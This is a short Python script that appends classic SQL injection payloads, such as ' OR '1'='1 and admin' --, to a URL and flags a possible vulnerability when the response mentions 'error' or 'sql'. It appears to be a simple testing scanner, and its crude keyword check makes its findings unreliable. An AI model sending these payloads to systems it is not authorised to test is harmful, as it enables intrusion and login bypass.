import requests

def check_sql_injection(url):
    payloads = [
        "' OR '1'='1",
        "' OR 'a'='a",
        "' OR '1'='1' -- ",
        "admin' --"
    ]
    
    for payload in payloads:
        target_url = f"{url}{payload}"
        response = requests.get(target_url)
        
        if "error" in response.text or "sql" in response.text.lower():
            print(f"Possible SQL Injection vulnerability found at {target_url}")
        else:
            print(f"No SQL Injection vulnerability at {target_url}")
